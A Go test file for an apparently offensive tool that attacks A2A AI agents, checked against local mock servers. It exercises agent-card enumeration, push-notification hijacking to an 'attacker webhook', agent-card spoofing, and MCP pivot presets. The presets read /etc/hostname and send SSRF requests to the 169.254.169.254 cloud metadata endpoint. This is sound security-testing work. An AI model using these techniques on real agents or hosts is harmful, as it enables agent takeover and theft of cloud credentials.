package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/professor-moody/aipostex/internal/exitcode"
)

const a2aSampleCard = `{
  "name": "DemoAgent",
  "description": "Demo agent for A2A tests",
  "url": "http://example.test",
  "version": "0.1",
  "skills": [
    {"name": "echo", "description": "echoes input", "inputModes": ["text"], "outputModes": ["text"], "tags": ["debug"]},
    {"name": "calculate", "description": "does math", "inputModes": ["text"], "outputModes": ["text"]}
  ]
}`

func newA2AMockServer(handler http.Handler) *httptest.Server {
	mux := http.NewServeMux()
	mux.HandleFunc("/.well-known/agent-card.json", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(a2aSampleCard))
	})
	if handler != nil {
		mux.Handle("/", handler)
	}
	return httptest.NewServer(mux)
}

func resetA2AFlags() func() {
	prevTarget := a2aTarget
	prevMsg := a2aMessage
	prevTask := a2aTaskID
	prevWebhook := a2aWebhookURL
	prevPreset := a2aPreset
	prevPath := a2aFileTarget
	prevURL := a2aSSRFURL
	prevMax := a2aStreamMax
	prevForce := cfg.ForceExploit
	return func() {
		a2aTarget = prevTarget
		a2aMessage = prevMsg
		a2aTaskID = prevTask
		a2aWebhookURL = prevWebhook
		a2aPreset = prevPreset
		a2aFileTarget = prevPath
		a2aSSRFURL = prevURL
		a2aStreamMax = prevMax
		cfg.ForceExploit = prevForce
	}
}

func TestRunA2AEnumAgainstMockServer(t *testing.T) {
	srv := newA2AMockServer(nil)
	defer srv.Close()
	defer resetA2AFlags()()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-enum.json")

		err := runA2AEnum(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		raw, readErr := os.ReadFile(cfg.OutputFile)
		if readErr != nil {
			t.Fatal(readErr)
		}
		content := string(raw)
		if !strings.Contains(content, "DemoAgent") {
			t.Errorf("agent name missing in output: %s", content)
		}
		if !strings.Contains(content, "A2A agent card exposed") {
			t.Errorf("expected enum title, got %s", content)
		}
		if !strings.Contains(content, `"action":"enum"`) {
			t.Error("metadata action missing")
		}
		if !strings.Contains(content, `"stage"`) {
			t.Error("stage missing")
		}
	})
}

func TestRunA2ASkillsEmitsFindingPerSkill(t *testing.T) {
	srv := newA2AMockServer(nil)
	defer srv.Close()
	defer resetA2AFlags()()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-skills.json")

		err := runA2ASkills(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		raw, readErr := os.ReadFile(cfg.OutputFile)
		if readErr != nil {
			t.Fatal(readErr)
		}
		content := string(raw)
		if !strings.Contains(content, "skill discovered: echo") {
			t.Errorf("echo skill missing: %s", content)
		}
		if !strings.Contains(content, "skill discovered: calculate") {
			t.Errorf("calculate skill missing: %s", content)
		}
		if strings.Count(content, `"action":"skills"`) < 3 { // summary + 2 skills
			t.Errorf("expected 3 skills findings, got %d", strings.Count(content, `"action":"skills"`))
		}
	})
}

func TestRunA2ATaskSendRequiresForceExploit(t *testing.T) {
	defer resetA2AFlags()()
	withTestConfig(t, func() {
		a2aTarget = "http://127.0.0.1:1"
		a2aMessage = "ping"
		cfg.ForceExploit = false
		err := runA2ATaskSend(nil, nil)
		if err == nil || !strings.Contains(err.Error(), "force") {
			t.Fatalf("expected force-exploit error, got %v", err)
		}
	})
}

func TestRunA2ATaskSendRequiresMessage(t *testing.T) {
	defer resetA2AFlags()()
	withTestConfig(t, func() {
		a2aTarget = "http://127.0.0.1:1"
		a2aMessage = ""
		cfg.ForceExploit = true
		err := runA2ATaskSend(nil, nil)
		if err == nil || !strings.Contains(err.Error(), "message") {
			t.Fatalf("expected message flag error, got %v", err)
		}
	})
}

func TestRunA2ATaskSendAgainstMockServer(t *testing.T) {
	var gotMethod string
	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var env map[string]interface{}
		_ = json.Unmarshal(body, &env)
		if m, ok := env["method"].(string); ok {
			gotMethod = m
		}
		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"task-abc","status":{"state":"completed"}}}`))
	}))
	defer srv.Close()
	defer resetA2AFlags()()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		a2aMessage = "ping"
		a2aTaskID = ""
		cfg.ForceExploit = true
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-send.json")

		err := runA2ATaskSend(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		if gotMethod != "SendMessage" {
			t.Errorf("expected SendMessage, got %q", gotMethod)
		}
		raw, _ := os.ReadFile(cfg.OutputFile)
		content := string(raw)
		if !strings.Contains(content, "task-abc") {
			t.Errorf("expected task-abc in output: %s", content)
		}
		if !strings.Contains(content, `"landed":"execution-confirmed"`) {
			t.Errorf("expected execution-confirmed landed: %s", content)
		}
	})
}

// A 200 JSON-RPC envelope whose task state is "failed" must NOT be claimed as
// execution-confirmed: the submission landed (influenced), execution did not.
func TestRunA2ATaskSendFailedStateIsInfluenced(t *testing.T) {
	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"task-fail","status":{"state":"failed"}}}`))
	}))
	defer srv.Close()
	defer resetA2AFlags()()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		a2aMessage = "ping"
		a2aTaskID = ""
		cfg.ForceExploit = true
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-send-failed.json")

		err := runA2ATaskSend(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		raw, _ := os.ReadFile(cfg.OutputFile)
		content := string(raw)
		if strings.Contains(content, `"landed":"execution-confirmed"`) {
			t.Errorf("a failed task must not be execution-confirmed: %s", content)
		}
		if !strings.Contains(content, `"landed":"influenced"`) {
			t.Errorf("expected influenced landed for a failed task: %s", content)
		}
		if !strings.Contains(content, "accepted but did not complete") {
			t.Errorf("expected an 'accepted but did not complete' title: %s", content)
		}
	})
}

func TestA2ATaskCompleted(t *testing.T) {
	for _, s := range []string{"completed", "Completed", " completed "} {
		if !a2aTaskCompleted(s) {
			t.Errorf("%q should count as completed", s)
		}
	}
	for _, s := range []string{"failed", "working", "submitted", "canceled", ""} {
		if a2aTaskCompleted(s) {
			t.Errorf("%q must not count as completed", s)
		}
	}
}

func TestRunA2ATaskStatusRequiresTaskID(t *testing.T) {
	defer resetA2AFlags()()
	withTestConfig(t, func() {
		a2aTarget = "http://127.0.0.1:1"
		a2aTaskID = ""
		err := runA2ATaskStatus(nil, nil)
		if err == nil || !strings.Contains(err.Error(), "task-id") {
			t.Fatalf("expected task-id flag error, got %v", err)
		}
	})
}

func TestRunA2ATaskStatusAgainstMockServer(t *testing.T) {
	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"probe-1","status":{"state":"working"}}}`))
	}))
	defer srv.Close()
	defer resetA2AFlags()()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		a2aTaskID = "probe-1"
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-status.json")
		err := runA2ATaskStatus(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		raw, _ := os.ReadFile(cfg.OutputFile)
		content := string(raw)
		if !strings.Contains(content, `"task_status":"working"`) {
			t.Errorf("expected task_status=working, got %s", content)
		}
	})
}

func TestRunA2ATaskCancelRequiresForceExploit(t *testing.T) {
	defer resetA2AFlags()()
	withTestConfig(t, func() {
		a2aTarget = "http://127.0.0.1:1"
		a2aTaskID = "t-1"
		cfg.ForceExploit = false
		err := runA2ATaskCancel(nil, nil)
		if err == nil || !strings.Contains(err.Error(), "force") {
			t.Fatalf("expected force-exploit error, got %v", err)
		}
	})
}

func TestRunA2AStreamProbeRequiresForceExploit(t *testing.T) {
	defer resetA2AFlags()()
	withTestConfig(t, func() {
		a2aTarget = "http://127.0.0.1:1"
		a2aMessage = "x"
		cfg.ForceExploit = false
		err := runA2AStreamProbe(nil, nil)
		if err == nil || !strings.Contains(err.Error(), "force") {
			t.Fatalf("expected force-exploit error, got %v", err)
		}
	})
}

func TestRunA2AStreamProbeAgainstMockServer(t *testing.T) {
	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if got := r.Header.Get("Accept"); got != "text/event-stream" {
			t.Errorf("Accept header: got %q", got)
		}
		w.Header().Set("Content-Type", "text/event-stream")
		_, _ = w.Write([]byte("event: status\ndata: {\"state\":\"working\"}\n\n"))
	}))
	defer srv.Close()
	defer resetA2AFlags()()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		a2aMessage = "list tools"
		a2aStreamMax = 4096
		cfg.ForceExploit = true
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-stream.json")

		err := runA2AStreamProbe(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		raw, _ := os.ReadFile(cfg.OutputFile)
		content := string(raw)
		if !strings.Contains(content, `"event_count":1`) {
			t.Errorf("expected event_count=1 in output: %s", content)
		}
		if !strings.Contains(content, `"action":"stream-probe"`) {
			t.Errorf("expected action=stream-probe: %s", content)
		}
	})
}

func TestRunA2APushHijackRequiresForceExploit(t *testing.T) {
	defer resetA2AFlags()()
	withTestConfig(t, func() {
		a2aTarget = "http://127.0.0.1:1"
		a2aTaskID = "t-1"
		cfg.ForceExploit = false
		err := runA2APushHijack(nil, nil)
		if err == nil || !strings.Contains(err.Error(), "force") {
			t.Fatalf("expected force-exploit error, got %v", err)
		}
	})
}

func TestRunA2APushHijackAgainstMockServer(t *testing.T) {
	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var env map[string]interface{}
		_ = json.Unmarshal(body, &env)
		method, _ := env["method"].(string)
		if method == "CreateTaskPushNotificationConfig" {
			_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"t-1"}}`))
			return
		}
		if method == "GetTaskPushNotificationConfig" {
			_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"t-1","pushNotificationConfig":{"url":"https://aipostex-canary.example.invalid/webhook"}}}`))
			return
		}
		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{}}`))
	}))
	defer srv.Close()
	defer resetA2AFlags()()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		a2aTaskID = "t-1"
		a2aWebhookURL = "https://aipostex-canary.example.invalid/webhook"
		cfg.ForceExploit = true
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-push.json")

		err := runA2APushHijack(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		raw, _ := os.ReadFile(cfg.OutputFile)
		content := string(raw)
		if !strings.Contains(content, `"action":"push-hijack"`) {
			t.Error("action push-hijack missing")
		}
		if !strings.Contains(content, `"confirmed":true`) {
			t.Errorf("expected confirmed=true: %s", content)
		}
	})
}

func TestRunA2AMCPPivotPresets(t *testing.T) {
	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"t-1","status":{"state":"completed"}}}`))
	}))
	defer srv.Close()
	defer resetA2AFlags()()

	for _, preset := range []string{"tool-enum", "file-read", "ssrf"} {
		t.Run(preset, func(t *testing.T) {
			withTestConfig(t, func() {
				a2aTarget = srv.URL
				a2aPreset = preset
				a2aFileTarget = "/etc/hostname"
				a2aSSRFURL = "http://169.254.169.254/latest/meta-data/"
				cfg.ForceExploit = true
				cfg.Format = "json"
				cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-mcp-"+preset+".json")

				err := runA2AMCPPivot(nil, nil)
				if _, ok := err.(*exitcode.FindingsError); !ok {
					t.Fatalf("expected FindingsError, got %v", err)
				}
				raw, _ := os.ReadFile(cfg.OutputFile)
				content := string(raw)
				if !strings.Contains(content, `"action":"mcp-pivot"`) {
					t.Error("action mcp-pivot missing")
				}
				if !strings.Contains(content, `"preset":"`+preset+`"`) {
					t.Errorf("preset %q missing: %s", preset, content)
				}
			})
		})
	}
}

// card-spoof with --callback-url: a vuln agent that dereferences the supplied URL
// produces an out-of-band hit, which must upgrade the finding to listener-confirmed
// (exploited) rather than the mere influenced "accepted".
func TestRunA2ACardSpoofListenerConfirmed(t *testing.T) {
	defer resetA2AFlags()()
	prevWait := oobConfirmWait
	oobConfirmWait = 3 * time.Second
	defer func() { oobConfirmWait = prevWait }()
	port := oobFreePort(t)
	cbURL := fmt.Sprintf("http://127.0.0.1:%d/attacker-card.json", port)
	urlRe := regexp.MustCompile(`https?://[^\s"';]+`)

	// The mock agent extracts the caller-supplied URL and fetches it (the real vuln
	// agent's fetch-and-trust behaviour), then returns an accepted task.
	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		if m := urlRe.FindString(string(body)); m != "" {
			if resp, err := http.Get(m); err == nil { //nolint:noctx
				resp.Body.Close()
			}
		}
		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"t-1","status":{"state":"completed"}}}`))
	}))
	defer srv.Close()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		cfg.ForceExploit = true
		cfg.CallbackURL = cbURL
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-cardspoof.json")

		err := runA2ACardSpoof(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		content := readFile(t, cfg.OutputFile)
		if !strings.Contains(content, `"card_trust_signal":"card-trust-confirmed"`) {
			t.Errorf("expected card-trust-confirmed: %s", content)
		}
		if !strings.Contains(content, `"landed":"takeover-capable"`) {
			t.Errorf("expected takeover-capable on OOB-confirmed card spoof: %s", content)
		}
		if !strings.Contains(content, `"card_fetched":true`) {
			t.Errorf("expected card_fetched=true: %s", content)
		}
		if !strings.Contains(content, "OOB callback confirmed") {
			t.Errorf("expected OOB confirmation in evidence: %s", content)
		}
	})
}

// Without a dereference, card-spoof stays at the influenced "accepted" rung.
func TestRunA2ACardSpoofAcceptedNotConfirmed(t *testing.T) {
	defer resetA2AFlags()()
	prevWait := oobConfirmWait
	oobConfirmWait = 600 * time.Millisecond
	defer func() { oobConfirmWait = prevWait }()
	port := oobFreePort(t)
	cbURL := fmt.Sprintf("http://127.0.0.1:%d/attacker-card.json", port)

	// Agent accepts the task but does NOT fetch the URL.
	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"t-1","status":{"state":"completed"}}}`))
	}))
	defer srv.Close()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		cfg.ForceExploit = true
		cfg.CallbackURL = cbURL
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-cardspoof-noconfirm.json")

		err := runA2ACardSpoof(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		content := readFile(t, cfg.OutputFile)
		if strings.Contains(content, `"landed":"takeover-capable"`) {
			t.Errorf("must NOT claim takeover without a dereference: %s", content)
		}
		if !strings.Contains(content, `"card_trust_signal":"card-trust-accepted"`) {
			t.Errorf("expected card-trust-accepted: %s", content)
		}
	})
}

// push-hijack with --callback-url: an agent that DELIVERS to the registered
// webhook produces an out-of-band hit, upgrading to exploited (callback_confirmed),
// distinct from the persistence read-back.
func TestRunA2APushHijackListenerConfirmed(t *testing.T) {
	defer resetA2AFlags()()
	prevWait := oobConfirmWait
	oobConfirmWait = 3 * time.Second
	defer func() { oobConfirmWait = prevWait }()
	port := oobFreePort(t)
	cbURL := fmt.Sprintf("http://127.0.0.1:%d/webhook", port)
	urlRe := regexp.MustCompile(`https?://[^\s"';]+`)

	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var env map[string]interface{}
		_ = json.Unmarshal(body, &env)
		method, _ := env["method"].(string)
		// On registration, deliver a push to the registered webhook (the agent fires).
		if strings.Contains(method, "PushNotification") || strings.Contains(method, "pushNotification") {
			if m := urlRe.FindString(string(body)); m != "" {
				if resp, err := http.Post(m, "application/json", strings.NewReader(`{"taskId":"probe-1"}`)); err == nil { //nolint:noctx
					resp.Body.Close()
				}
			}
		}
		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"probe-1"}}`))
	}))
	defer srv.Close()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		a2aTaskID = "probe-1"
		cfg.ForceExploit = true
		cfg.CallbackURL = cbURL
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-push-confirmed.json")

		err := runA2APushHijack(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		content := readFile(t, cfg.OutputFile)
		if !strings.Contains(content, `"callback_confirmed":true`) {
			t.Errorf("expected callback_confirmed=true: %s", content)
		}
		if !strings.Contains(content, `"landed":"takeover-capable"`) {
			t.Errorf("expected takeover-capable on real delivery: %s", content)
		}
		if !strings.Contains(content, "delivered to attacker webhook") {
			t.Errorf("expected delivery title: %s", content)
		}
	})
}

// Registration accepted but NOT delivered must stay influenced, never exploited.
func TestRunA2APushHijackRegisteredNotDelivered(t *testing.T) {
	defer resetA2AFlags()()
	prevWait := oobConfirmWait
	oobConfirmWait = 600 * time.Millisecond
	defer func() { oobConfirmWait = prevWait }()
	port := oobFreePort(t)
	cbURL := fmt.Sprintf("http://127.0.0.1:%d/webhook", port)

	// Accepts the registration and echoes it back, but never delivers a push.
	srv := newA2AMockServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var env map[string]interface{}
		_ = json.Unmarshal(body, &env)
		method, _ := env["method"].(string)
		if strings.Contains(method, "Get") || strings.Contains(method, "get") {
			_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"probe-1","pushNotificationConfig":{"url":"` + cbURL + `"}}}`))
			return
		}
		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"x","result":{"id":"probe-1"}}`))
	}))
	defer srv.Close()

	withTestConfig(t, func() {
		a2aTarget = srv.URL
		a2aTaskID = "probe-1"
		cfg.ForceExploit = true
		cfg.CallbackURL = cbURL
		cfg.Format = "json"
		cfg.OutputFile = filepath.Join(t.TempDir(), "a2a-push-nodeliver.json")

		err := runA2APushHijack(nil, nil)
		if _, ok := err.(*exitcode.FindingsError); !ok {
			t.Fatalf("expected FindingsError, got %v", err)
		}
		content := readFile(t, cfg.OutputFile)
		if strings.Contains(content, `"landed":"takeover-capable"`) {
			t.Errorf("must NOT claim takeover without delivery: %s", content)
		}
		// The set finding is influenced; the readback is at most read-confirmed (persistence).
		if !strings.Contains(content, `"landed":"influenced"`) {
			t.Errorf("expected influenced registration finding: %s", content)
		}
		if strings.Contains(content, "hijack confirmed") {
			t.Errorf("readback must not say 'hijack confirmed': %s", content)
		}
	})
}

func TestRunA2AMCPPivotUnknownPreset(t *testing.T) {
	defer resetA2AFlags()()
	withTestConfig(t, func() {
		a2aTarget = "http://127.0.0.1:1"
		a2aPreset = "bogus"
		cfg.ForceExploit = true
		err := runA2AMCPPivot(nil, nil)
		if err == nil || !strings.Contains(err.Error(), "preset") {
			t.Fatalf("expected unknown preset error, got %v", err)
		}
	})
}
